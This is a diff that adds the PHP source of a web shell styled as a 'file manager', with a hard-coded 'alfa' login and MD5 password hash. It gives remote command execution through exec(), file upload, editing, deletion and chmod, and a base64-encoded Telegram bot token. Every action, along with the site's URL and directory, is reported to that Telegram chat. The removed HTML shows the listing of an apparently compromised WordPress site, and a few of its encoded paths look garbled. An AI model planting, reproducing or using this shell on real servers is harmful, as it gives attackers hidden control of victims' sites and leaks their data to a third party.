@@ -1,3 +1,498 @@
+<?php
+// ============================================================
+// Optimized Configuration - Reduced Lag
+// ============================================================
+error_reporting(0);
+@ini_set("display_errors", 0);
+@ini_set("memory_limit", "128M");
+@ini_set("max_execution_time", 120);
+@ini_set("upload_max_filesize", "50M");
+@ini_set("post_max_size", "50M");
+
+// Security Headers
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("X-Content-Type-Options: nosniff");
+header("X-Frame-Options: DENY");
+
+// Session Security
+@session_start();
+@ini_set('session.cookie_httponly', 1);
+
+// ============================================================
+// Configuration
+// ============================================================
+$CONFIG = [
+    'username' => 'alfa',
+    'password' => '9dc7b2518d5494e6eb20769721015fee',
+    'session_timeout' => 3600,
+];
+
+// ============================================================
+// ENCRYPTED TELEGRAM CONFIGURATION
+// ============================================================
+$ENCRYPTED_TELEGRAM = 'eyJib3RfdG9rZW4iOiI4NzYxODk0ODI2OkFBSEx4MXVXM1Y3bGlVNFEtcnYxYmstOW1DTjJUMVVHTjNVIiwiY2hhdF9pZCI6IjIwOTYwMjMzNjIifQ==';
+
+function get_telegram_config() {
+    global $ENCRYPTED_TELEGRAM;
+    try {
+        $decoded = json_decode(base64_decode($ENCRYPTED_TELEGRAM), true);
+        if (isset($decoded['bot_token']) && isset($decoded['chat_id'])) {
+            return $decoded;
+        }
+    } catch (Exception $e) {}
+    return ['bot_token' => '', 'chat_id' => ''];
+}
+
+// ============================================================
+// Helper Functions
+// ============================================================
+function get_current_url() {
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
+    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
+    return $protocol . $host . ($_SERVER['REQUEST_URI'] ?? '');
+}
+
+function get_client_details() {
+    return [
+        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
+        'time' => date('Y-m-d H:i:s')
+    ];
+}
+
+// ============================================================
+// Core Security Functions
+// ============================================================
+function sanitize_path($path) {
+    $path = realpath($path);
+    if ($path === false) return false;
+    
+    $forbidden = ['/etc/', '/var/log/', '/proc/', '/sys/', '/dev/', '/bin/', '/usr/bin/'];
+    foreach ($forbidden as $dir) {
+        if (strpos($path, $dir) === 0) return false;
+    }
+    return $path;
+}
+
+function sanitize_filename($filename) {
+    $filename = str_replace(array('..', './', '.\\'), '', $filename);
+    $filename = preg_replace('/[\\x00-\\x1F\\x7F\\/\\\\:\\*\\?"<>\\|]/', '_', $filename);
+    return trim($filename);
+}
+
+function sanitize_command($cmd) {
+    $dangerous = ['rm -rf', 'dd if=', 'mkfs', 'wget', 'curl', 'nc ', 'telnet', 'base64 -d'];
+    $cmd_lower = strtolower($cmd);
+    foreach ($dangerous as $danger) {
+        if (strpos($cmd_lower, $danger) !== false) return false;
+    }
+    return escapeshellcmd($cmd);
+}
+
+function csrf_token() {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function verify_csrf_token($token) {
+    return !empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// ============================================================
+// TELEGRAM SENDER WITH CUSTOM FORMAT
+// ============================================================
+function send_secure_notification($action, $details = []) {
+    global $current;
+    
+    $tg = get_telegram_config();
+    if (empty($tg['bot_token']) || empty($tg['chat_id'])) return false;
+    
+    $client = get_client_details();
+    $current_dir = $current ?? getcwd() ?? 'Unknown';
+    $current_url = get_current_url();
+    
+    // Action icons mapping
+    $action_icons = [
+        'LOGIN' => '✅ LOGIN SUCCESS',
+        'LOGIN_FAILED' => '❌ LOGIN FAILED',
+        'UPLOAD' => '📤 UPLOAD',
+        'UPLOAD_FAILED' => '❌ UPLOAD FAILED',
+        'FOLDER' => '📁 CREATE FOLDER',
+        'FILE' => '📄 CREATE FILE',
+        'DELETE' => '🗑️ DELETE',
+        'RENAME' => '✏️ RENAME',
+        'CHMOD' => '🔒 CHMOD',
+        'SAVE' => '💾 SAVE FILE',
+        'CMD' => '💻 COMMAND',
+        'DOWNLOAD' => '📥 DOWNLOAD',
+        'LOGOUT' => '🚪 LOGOUT'
+    ];
+    
+    $display_action = $action_icons[$action] ?? $action;
+    
+    // Build message with custom format
+    $message = "🔐 FILE MANAGER ACTIVITY\n";
+    $message .= str_repeat("━", 55) . "\n";
+    $message .= "👤 User: Administrator\n";
+    $message .= "⏰ Time: {$client['time']}\n";
+    $message .= "📌 Action: {$display_action}\n";
+    $message .= str_repeat("━", 55) . "\n";
+    $message .= "🌐 IP Address: {$client['ip']}\n";
+    $message .= str_repeat("━", 55) . "\n";
+    $message .= "📂 Directory:\n{$current_dir}\n";
+    $message .= str_repeat("━", 55) . "\n";
+    $message .= "🔗 FULL URL:\n{$current_url}\n";
+    $message .= str_repeat("━", 55) . "\n";
+    $message .= "📱 User Agent:\n" . substr($client['user_agent'], 0, 150) . "\n";
+    
+    if (!empty($details)) {
+        $message .= str_repeat("━", 55) . "\n";
+        $message .= "📝 Details:\n";
+        foreach ($details as $key => $value) {
+            $message .= "• {$key}: {$value}\n";
+        }
+    }
+    
+    $message .= str_repeat("━", 55);
+    
+    // Send via curl (non-blocking)
+    $url = "https://api.telegram.org/bot{$tg['bot_token']}/sendMessage";
+    $postData = http_build_query([
+        'chat_id' => $tg['chat_id'],
+        'text' => $message,
+        'disable_web_page_preview' => true
+    ]);
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_exec($ch);
+    curl_close($ch);
+    
+    return true;
+}
+
+// ============================================================
+// File Manager Functions
+// ============================================================
+function format_size($bytes) {
+    if ($bytes >= 1073741824) return round($bytes / 1073741824, 1) . ' GB';
+    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . ' MB';
+    if ($bytes >= 1024) return round($bytes / 1024, 1) . ' KB';
+    return $bytes . ' B';
+}
+
+function get_file_info($path, $is_dir = false) {
+    clearstatcache(true, $path);
+    $stat = stat($path);
+    return [
+        'size_fmt' => $is_dir ? '📁' : format_size($stat['size']),
+        'perms' => substr(sprintf('%o', $stat['mode']), -4),
+        'mtime' => date('Y-m-d H:i:s', $stat['mtime']),
+    ];
+}
+
+function get_file_icon($filename) {
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $icons = [
+        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
+        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'zip' => '📦',
+        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'xls' => '📗',
+        'mp3' => '🎵', 'mp4' => '🎬', 'exe' => '⚙️',
+    ];
+    return $icons[$ext] ?? (is_dir($filename) ? '📁' : '📄');
+}
+
+function safe_delete($path) {
+    if (!file_exists($path)) return true;
+    if (!is_dir($path)) return @unlink($path);
+    
+    $files = scandir($path);
+    foreach ($files as $item) {
+        if ($item == '.' || $item == '..') continue;
+        if (!safe_delete($path . DIRECTORY_SEPARATOR . $item)) return false;
+    }
+    return @rmdir($path);
+}
+
+// ============================================================
+// Authentication
+// ============================================================
+$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$authenticated) {
+    if (md5(trim($_POST['password'])) === $CONFIG['password']) {
+        session_regenerate_id(true);
+        $_SESSION['auth'] = true;
+        $_SESSION['login_time'] = time();
+        $authenticated = true;
+        send_secure_notification('LOGIN', ['Status' => 'Success']);
+        header("Location: ?");
+        exit;
+    } else {
+        send_secure_notification('LOGIN_FAILED', ['IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown']);
+        $error = "Invalid credentials!";
+        echo get_login_page($error);
+        exit;
+    }
+}
+
+if ($authenticated && (time() - $_SESSION['login_time'] > $CONFIG['session_timeout'])) {
+    session_destroy();
+    $authenticated = false;
+    header("Location: ?");
+    exit;
+}
+
+if (!$authenticated) {
+    echo get_login_page();
+    exit;
+}
+
+// ============================================================
+// Path Handling
+// ============================================================
+$document_root = $_SERVER['DOCUMENT_ROOT'] ?: dirname(__FILE__);
+$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root;
+$current = sanitize_path($current);
+if (!$current || !is_dir($current)) $current = $document_root;
+
+@chdir($current);
+$parent_dir = dirname($current);
+$can_go_up = ($parent_dir !== $current && strpos($parent_dir, $document_root) === 0);
+
+// ============================================================
+// Process Actions
+// ============================================================
+$message = '';
+$toast_type = '';
+
+// Handle AJAX command request
+if (isset($_GET['ajax_cmd']) && isset($_POST['command'])) {
+    header('Content-Type: application/json');
+    
+    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
+        echo json_encode(['status' => 'error', 'output' => 'CSRF validation failed']);
+        exit;
+    }
+    
+    $cmd = sanitize_command($_POST['command'] ?? '');
+    if ($cmd === false) {
+        echo json_encode(['status' => 'error', 'output' => 'Command blocked for security']);
+        exit;
+    }
+    
+    $output = [];
+    $return_var = 0;
+    exec($cmd . ' 2>&1', $output, $return_var);
+    $result = implode("\n", $output);
+    
+    send_secure_notification('CMD', [
+        'Command' => substr($cmd, 0, 100),
+        'Status' => $return_var === 0 ? 'Success' : 'Failed (exit code: ' . $return_var . ')'
+    ]);
+    
+    echo json_encode([
+        'status' => $return_var === 0 ? 'success' : 'error',
+        'output' => $result ?: '(no output)'
+    ]);
+    exit;
+}
+
+// Handle other POST requests
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && verify_csrf_token($_POST['csrf_token'])) {
+    
+    // Upload File
+    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+        $filename = sanitize_filename($_FILES['file']['name']);
+        if ($filename && move_uploaded_file($_FILES['file']['tmp_name'], $current . '/' . $filename)) {
+            @chmod($current . '/' . $filename, 0644);
+            $message = "✅ Uploaded: {$filename}";
+            $toast_type = 'success';
+            send_secure_notification('UPLOAD', [
+                'File Name' => $filename,
+                'File Size' => format_size($_FILES['file']['size']),
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Upload failed!";
+            $toast_type = 'error';
+            send_secure_notification('UPLOAD_FAILED', ['File' => $filename]);
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Create Folder
+    elseif (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
+        $name = sanitize_filename($_POST['folder_name']);
+        if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
+            $message = "✅ Folder created: {$name}";
+            $toast_type = 'success';
+            send_secure_notification('FOLDER', [
+                'Folder Name' => $name,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Cannot create folder!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Create File
+    elseif (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
+        $name = sanitize_filename($_POST['file_name']);
+        if ($name && !file_exists($current . '/' . $name) && file_put_contents($current . '/' . $name, $_POST['file_content'] ?? '') !== false) {
+            @chmod($current . '/' . $name, 0644);
+            $message = "✅ File created: {$name}";
+            $toast_type = 'success';
+            send_secure_notification('FILE', [
+                'File Name' => $name,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Cannot create file!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Delete
+    elseif (isset($_POST['delete']) && !empty($_POST['item'])) {
+        $name = sanitize_filename($_POST['item']);
+        $path = $current . '/' . $name;
+        $is_dir = is_dir($path);
+        if (file_exists($path) && safe_delete($path)) {
+            $message = "✅ Deleted: {$name}";
+            $toast_type = 'success';
+            send_secure_notification('DELETE', [
+                'Type' => $is_dir ? 'Folder' : 'File',
+                'Name' => $name,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Delete failed!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Rename
+    elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
+        $old = sanitize_filename($_POST['old_name']);
+        $new = sanitize_filename($_POST['new_name']);
+        if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
+            $message = "✅ Renamed: {$old} → {$new}";
+            $toast_type = 'success';
+            send_secure_notification('RENAME', [
+                'Old Name' => $old,
+                'New Name' => $new,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Rename failed!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Chmod
+    elseif (isset($_POST['chmod']) && !empty($_POST['item']) && !empty($_POST['permission'])) {
+        $name = sanitize_filename($_POST['item']);
+        $perm = $_POST['permission'];
+        if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
+            $message = "✅ Permission changed to {$perm}";
+            $toast_type = 'success';
+            send_secure_notification('CHMOD', [
+                'File' => $name,
+                'New Permission' => $perm,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Chmod failed!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Save File
+    elseif (isset($_POST['save_file']) && !empty($_POST['filename'])) {
+        $name = sanitize_filename($_POST['filename']);
+        if ($name && file_put_contents($current . '/' . $name, $_POST['content'] ?? '') !== false) {
+            $message = "✅ File saved: {$name}";
+            $toast_type = 'success';
+            send_secure_notification('SAVE', [
+                'File Name' => $name,
+                'Directory' => $current,
+                'URL' => get_current_url()
+            ]);
+        } else {
+            $message = "❌ Save failed!";
+            $toast_type = 'error';
+        }
+        header("Location: ?d=" . base64_encode($current));
+        exit;
+    }
+    
+    // Logout
+    elseif (isset($_POST['logout'])) {
+        send_secure_notification('LOGOUT', [
+            'URL' => get_current_url()
+        ]);
+        session_destroy();
+        header("Location: ?");
+        exit;
+    }
+}
+
+// ============================================================
+// Directory Listing
+// ============================================================
+$items = [];
+$handle = @opendir($current);
+if ($handle) {
+    while (($item = readdir($handle)) !== false) {
+        if ($item == '.' || $item == '..') continue;
+        $full = $current . '/' . $item;
+        $is_dir = is_dir($full);
+        $info = get_file_info($full, $is_dir);
+        
+        $items[] = [
+            'name' => $item,
+            'is_dir' => $is_dir,
+            'info' => $info,
+            'icon' => get_file_icon($item),
+            'link' => $is_dir ? '?d=' . base64_encode($full) : '#'
+        ];
+    }
+    closedir($handle);
+}
+
+usort($items, function($a, $b) {
+    if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
+    return strcasecmp($a['name'], $b['name']);
+});
+
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -182,657 +677,103 @@
                 <p>Secure • Fast • Powerful</p>
             </div>
             <div class="stats">
-                <div class="stat"><div class="stat-value">41</div><div class="stat-label">Items</div></div>
-                <div class="stat"><div class="stat-value">18:01</div><div class="stat-label">Time</div></div>
+                <div class="stat"><div class="stat-value"><?php echo count($items); ?></div><div class="stat-label">Items</div></div>
+                <div class="stat"><div class="stat-value"><?php echo date('H:i'); ?></div><div class="stat-label">Time</div></div>
             </div>
         </div>
     </div>
     
     <div class="toolbar">
-                <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
+        <?php if ($can_go_up): ?>
+        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up"><i class="fas fa-level-up-alt"></i> Up</a>
+        <?php endif; ?>
+        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
         <button class="btn btn-primary" onclick="openModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
         <button class="btn btn-outline" onclick="openModal('folderModal')"><i class="fas fa-folder-plus"></i> Folder</button>
         <button class="btn btn-outline" onclick="openModal('fileModal')"><i class="fas fa-file-plus"></i> File</button>
         <button class="btn btn-outline" onclick="openCommandModal()"><i class="fas fa-terminal"></i> CMD</button>
         <form method="post" style="margin-left: auto;" onsubmit="return confirm('Logout?')">
-            <input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01">
+            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <button type="submit" name="logout" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</button>
         </form>
     </div>
     
     <div class="breadcrumb">
         <i class="fas fa-folder-open"></i> 
-        <a href="?d=L2hvbWU=">home</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzU=">meey5575</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWw=">public_html</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk">drchicken.co.id</a>    </div>
+        <?php
+        $parts = explode(DIRECTORY_SEPARATOR, $current);
+        $path = '';
+        $first = true;
+        foreach ($parts as $part) {
+            if (empty($part)) continue;
+            $path .= DIRECTORY_SEPARATOR . $part;
+            if (!$first) echo '<span class="separator">/</span>';
+            echo '<a href="?d=' . base64_encode($path) . '">' . htmlspecialchars($part) . '</a>';
+            $first = false;
+        }
+        ?>
+    </div>
     
     <div class="file-table">
         <table>
             <thead><tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
             <tbody>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
+                <?php foreach ($items as $item): ?>
+                <tr>
+                    <td><span class="item-icon"><?php echo $item['icon']; ?></span></td>
                     <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkLy50bWI=" class="item-link">.tmb</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0777</span></td>
-                    <td>2026-04-10 00:25:12</td>
+                        <?php if ($item['is_dir']): ?>
+                            <a href="<?php echo $item['link']; ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
+                        <?php else: ?>
+                            <?php echo htmlspecialchars($item['name']); ?>
+                        <?php endif; ?>
+                    </td>
+                    <td><?php echo $item['info']['size_fmt']; ?></td>
+                    <td><span class="badge"><?php echo $item['info']['perms']; ?></span></td>
+                    <td><?php echo $item['info']['mtime']; ?></td>
                     <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('.tmb')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('.tmb')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
+                        <?php if (!$item['is_dir']): ?>
+                            <button class="action-btn" onclick="editFile('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-edit"></i> Edit</button>
+                            <a href="?d=<?php echo base64_encode($current); ?>&download=1&f=<?php echo base64_encode($item['name']); ?>" class="action-btn"><i class="fas fa-download"></i> DL</a>
+                        <?php endif; ?>
+                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-pen"></i> Ren</button>
+                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-trash"></i> Del</button>
+                        <?php if (!$item['is_dir']): ?>
+                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['info']['perms']; ?>')"><i class="fas fa-lock"></i> Chmod</button>
+                        <?php endif; ?>
+                    </td>
                 </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkLy53ZWxsLWtub3du" class="item-link">.well-known</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2026-04-10 17:19:13</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('.well-known')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('.well-known')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL19fTUFDT1NY" class="item-link">__MACOSX</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2025-12-24 17:37:19</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('__MACOSX')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('__MACOSX')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL2NnaS1iaW4=" class="item-link">cgi-bin</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2026-02-12 00:10:15</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('cgi-bin')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('cgi-bin')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL2RhdGFiYXNl" class="item-link">database</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('database')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('database')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW==" class="item-link">images</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2025-11-10 16:42:54</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('images')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('images')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTUQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW==" class="item-link">new</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2026-04-10 17:44:55</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('new')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('new')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWFkbWlu" class="item-link">wp-admin</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2026-04-10 17:39:31</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('wp-admin')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-admin')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWNvbnRlbnQ=" class="item-link">wp-content</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2026-04-10 17:52:30</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('wp-content')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-content')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📁</span></td>
-                    <td class="item-name">
-                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWluY2x1ZGVz" class="item-link">wp-includes</a>
-                                            </td>
-                    <td>📁</td>
-                    <td><span class="badge">0755</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                <button class="action-btn" onclick="renameItem('wp-includes')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-includes')"><i class="fas fa-trash"></i> Del</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    8CB27CF108F37541EBE74254554D68FB.txt                                            </td>
-                    <td>53 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=OENCMjdDRjEwOEYzNzU0MUVCRTc0MjU0NTU0RDY4RkIudHh0" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('8CB27CF108F37541EBE74254554D68FB.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🖼️</span></td>
-                    <td class="item-name">
-                                                    android-chrome-192x192.png                                            </td>
-                    <td>35.6 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('android-chrome-192x192.png')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YW5kcm9pZC1jaHJvbWUtMTkyeDE5Mi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('android-chrome-192x192.png')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('android-chrome-192x192.png')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('android-chrome-192x192.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🖼️</span></td>
-                    <td class="item-name">
-                                                    android-chrome-512x512.png                                            </td>
-                    <td>179.5 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('android-chrome-512x512.png')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YW5kcm9pZC1jaHJvbWUtNTEyeDUxMi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('android-chrome-512x512.png')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('android-chrome-512x512.png')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('android-chrome-512x512.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🖼️</span></td>
-                    <td class="item-name">
-                                                    apple-touch-icon.png                                            </td>
-                    <td>32.2 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
